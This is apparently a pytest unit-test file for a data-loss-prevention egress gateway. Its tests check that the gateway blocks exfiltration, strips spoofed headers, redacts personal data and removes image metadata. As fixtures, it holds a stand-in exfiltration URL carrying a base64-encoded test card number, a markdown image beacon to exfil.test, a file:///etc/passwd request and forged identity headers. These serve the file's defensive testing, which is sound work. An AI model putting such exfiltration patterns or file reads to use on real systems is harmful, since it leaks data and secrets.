"""META-V09 (unit): /egress route + forwarder with a fake runtime/pipeline (real DLP-03/04/06
controls, MockTransport upstream). No ports, no models."""

from __future__ import annotations

import base64
import json

import httpx
import pytest
from fastapi import FastAPI

from aegis.api.routes import egress as route
from aegis.controls.egress.dlp03_metadata import CONTROLS as C3
from aegis.controls.egress.dlp04_exfil import CONTROLS as C4
from aegis.controls.egress.dlp06_channels import CONTROLS as C6
from aegis.core.types import (
    ACTION_PRECEDENCE,
    Decision,
    Identity,
    Redaction,
    RequestContext,
    TextSegment,
    Verdict,
)
from aegis.egress.forwarder import EgressForwarder, EgressRequest, EgressValidationError
from aegis.egress.hostmap import DEFAULT_HOST_MAP, HostMap, UnresolvableHost
from tests.unit.metadata_egress.helpers import apply_findings, make_cfg, make_snapshot


class FakeOrg:
    async def resolve_identity(self, headers, *, hints=None):
        return Identity(agent_id=headers.get("x-aegis-agent") or "tester@platform")

    async def get_agent(self, agent_id):
        return None


class FakePipeline:
    """Runs the real metadata-egress controls; applies findings with the test vault."""

    def __init__(self, snap, *, force: Decision | None = None, segment_patch=None) -> None:
        self.snap = snap
        self.force = force
        self.segment_patch = segment_patch or {}
        self.completed: list = []
        self.evaluated: list = []
        self.attached: list = []

    def new_context(self, *, source, identity, session_id=None, headers=None,
                    approval_token=None, wait_for_approval_s=0.0, client_ip=None, **_):
        ctx = RequestContext(request_id="req_t", session_id=session_id or "ses_t",
                             identity=identity, source=source)
        ctx.policy = self.snap
        return ctx

    async def evaluate(self, ctx, interaction, **_):
        interaction.id = interaction.id or f"int_{len(self.evaluated)}"
        self.evaluated.append(interaction)
        decisions: list[Decision] = []
        for ctl in (C3[0], C4[0], C6[0]):
            if interaction.surface not in ctl.applies_to.surfaces:
                continue
            d = await ctl.evaluate(ctx, interaction, make_cfg(ctl.id))
            if d is not None:
                decisions.append(d)
        if self.force is not None and interaction.surface == "egress.request":
            decisions.append(self.force)
        action = "allow"
        primary = None
        for d in decisions:
            if ACTION_PRECEDENCE.get(d.action, 0) > ACTION_PRECEDENCE.get(action, 0):
                action, primary = d.action, d
        findings = [f for d in decisions for f in d.findings]
        segs = []
        reds = []
        for i, s in enumerate(interaction.segments):
            text = apply_findings(s.text, findings, segment_index=i) if s.redactable else s.text
            text = self.segment_patch.get(s.path, text)
            if text != s.text:
                reds.append(Redaction(control_id="DLP-03", entity="X", data_class="INTERNAL",
                                      segment_index=i, path=s.path, start=0, end=1,
                                      placeholder="[X]"))
            segs.append(TextSegment(**{**s.model_dump(), "text": text}))
        return Verdict(id=f"dec_{len(self.evaluated)}", request_id=ctx.request_id,
                       interaction_id=interaction.id, action=action, primary=primary,
                       decisions=decisions, segments=segs, redactions=reds,
                       mutations=[m for d in decisions for m in d.mutations])

    async def complete(self, ctx, interaction, verdict, outcome):
        self.completed.append((verdict.id, outcome))

    def attach_response(self, decision_id, *, response_raw, response_local):
        self.attached.append(decision_id)


class FakeRt:
    def __init__(self, pipeline) -> None:
        self.pipeline = pipeline
        self.org = FakeOrg()
        self.extras: dict = {}

        class _P:
            def snapshot(s):
                return pipeline.snap

        self.policy = _P()
        self.settings = None


def build(handler, **pipe_kw):
    snap = make_snapshot()
    pipe = FakePipeline(snap, **pipe_kw)
    rt = FakeRt(pipe)
    app = FastAPI()
    app.include_router(route.router)
    app.state.rt = rt
    fwd = EgressForwarder(HostMap.parse(DEFAULT_HOST_MAP))
    fwd.set_transport(httpx.MockTransport(handler))
    rt.extras[route._STATE_KEY] = fwd
    client = httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://aegis")
    return client, pipe


def recorder(status=200, body=None):
    seen: list[httpx.Request] = []

    def handler(req: httpx.Request) -> httpx.Response:
        seen.append(req)
        return httpx.Response(status, json=body if body is not None else {"ok": True})

    return seen, handler


# ---------------------------------------------------------------- unit pieces
def test_hostmap_resolve() -> None:
    hm = HostMap.parse(DEFAULT_HOST_MAP)
    t = hm.resolve("https://crm.saas.test/crm/contacts?x=1")
    assert t.mapped and t.connect_url == "http://127.0.0.1:8794/crm/contacts?x=1"
    assert t.host_header == "crm.saas.test"
    assert not hm.resolve("https://api.example.com/v1").mapped
    with pytest.raises(UnresolvableHost):
        hm.resolve("https://unknown.test/")


@pytest.mark.parametrize("data", [
    {"method": "TRACE", "url": "https://a.example/"},
    {"method": "GET", "url": "ftp://a.example/"},
    {"method": "POST", "url": "https://a.example/", "json": {"a": 1}, "body": "x"},
])
def test_validation(data) -> None:
    with pytest.raises(EgressValidationError):
        EgressRequest.parse(data)


# ---------------------------------------------------------------- route
async def test_blocked_exfil_never_contacts_upstream() -> None:
    seen, handler = recorder()
    client, pipe = build(handler)
    pan = base64.b64encode(b"4111 1111 1111 1111").decode()
    async with client:
        r = await client.post("/egress", json={"method": "GET",
                                               "url": f"https://exfil.test/c?d={pan}"})
    assert r.status_code == 403
    err = r.json()["error"]
    assert err["type"] == "policy_blocked" and err["control_id"] == "DLP-04"
    assert seen == []
    assert len(pipe.completed) == 1 and pipe.completed[0][1].status_code == 403
    assert r.headers["x-aegis-decision"] == "block"


async def test_allowed_strips_headers_and_maps_host() -> None:
    seen, handler = recorder(body={"contacts": [{"name": "Acme"}]})
    client, pipe = build(handler)
    async with client:
        r = await client.post("/egress", headers={"x-aegis-agent": "research-agent@research"},
                              json={"method": "GET", "url": "https://crm.saas.test/crm/contacts",
                                    "headers": {"X-Forwarded-For": "10.1.2.3", "Cookie": "s=1",
                                                "x-stainless-os": "MacOS",
                                                "Accept": "application/json",
                                                "X-Aegis-Agent": "spoof"}})
    assert r.status_code == 200, r.text
    assert len(seen) == 1
    up = seen[0]
    assert str(up.url) == "http://127.0.0.1:8794/crm/contacts"
    assert up.headers["host"] == "crm.saas.test"
    for h in ("x-forwarded-for", "cookie", "x-stainless-os", "x-aegis-agent"):
        assert h not in up.headers
    assert up.headers["user-agent"] == "aegis/0.1"
    assert up.headers["accept"] == "application/json"
    body = r.json()
    assert body["status"] == 200 and body["body"] == {"contacts": [{"name": "Acme"}]}
    assert body["decision_id"] and body["response_decision_id"]
    assert len(pipe.completed) == 1 and pipe.completed[0][1].usage.requests == 1
    assert pipe.attached == [body["decision_id"]]
    assert "server-timing" in r.headers and r.headers["x-aegis-response-decision-id"]


async def test_redacted_json_leaf_written_back() -> None:
    seen, handler = recorder()
    client, _ = build(handler, segment_patch={"json.note": "Client [PESEL_1] asked"})
    async with client:
        r = await client.post("/egress", json={
            "method": "POST", "url": "https://crm.saas.test/crm/notes",
            "json": {"note": "Client 44051401359 asked", "n": 3}})
    assert r.status_code == 200
    sent = json.loads(seen[0].content)
    assert sent == {"note": "Client [PESEL_1] asked", "n": 3}
    assert seen[0].headers["content-type"] == "application/json"


async def test_response_redaction_applied() -> None:
    _seen, handler = recorder(body={"html": "ok ![x](https://exfil.test/p.png?d=c2VjcmV0)"})
    client, _ = build(handler)
    async with client:
        r = await client.post("/egress", json={"method": "GET",
                                               "url": "https://crm.saas.test/p/1"})
    assert r.status_code == 200
    assert r.json()["body"]["html"] == "ok [image removed by Aegis: exfil.test]"


async def test_unmapped_test_host_502() -> None:
    seen, handler = recorder()
    client, pipe = build(handler)
    async with client:
        r = await client.post("/egress", json={"method": "GET", "url": "https://nowhere.test/"})
    assert r.status_code == 502 and r.json()["error"]["type"] == "upstream_error"
    assert seen == [] and len(pipe.completed) == 1


async def test_approval_envelope() -> None:
    seen, handler = recorder()
    force = Decision(control_id="ACT-03", action="require_approval", reason="spend over limit",
                     approval_id="apr_123")
    client, pipe = build(handler, force=force)
    async with client:
        r = await client.post("/egress", json={"method": "POST",
                                               "url": "https://pay.saas.test/payments/charge",
                                               "json": {"amount_usd": 480}})
    assert r.status_code == 403
    err = r.json()["error"]
    assert err["type"] == "approval_required" and err["approval_id"] == "apr_123"
    assert r.headers["x-aegis-approval-id"] == "apr_123"
    assert seen == [] and len(pipe.completed) == 1


async def test_upstream_error_502() -> None:
    def handler(req):
        raise httpx.ConnectError("refused")

    client, pipe = build(handler)
    async with client:
        r = await client.post("/egress", json={"method": "GET",
                                               "url": "https://crm.saas.test/x"})
    assert r.status_code == 502
    assert len(pipe.completed) == 1 and pipe.completed[0][1].status_code == 502


async def test_bad_request_400() -> None:
    _, handler = recorder()
    client, pipe = build(handler)
    async with client:
        r = await client.post("/egress", json={"method": "GET", "url": "file:///etc/passwd"})
    assert r.status_code == 400 and pipe.completed == []


async def test_media_body_mutation_reaches_upstream() -> None:
    from aegis.egress import fixtures
    from aegis.egress.metadata import inspect_bytes

    seen, handler = recorder()
    client, _ = build(handler)
    png = base64.b64encode(fixtures.png_with_xmp()).decode()
    async with client:
        r = await client.post("/egress", json={
            "method": "POST", "url": "https://crm.saas.test/crm/upload",
            "json": {"name": "chart.png", "file": "data:image/png;base64," + png}})
    assert r.status_code == 200, r.text
    sent = json.loads(seen[0].content)
    assert sent["name"] == "chart.png" and sent["file"].startswith("data:image/png;base64,")
    cleaned = base64.b64decode(sent["file"].split(",", 1)[1])
    assert inspect_bytes(cleaned).found == []
    assert "body:set:file" in r.json()["applied"]
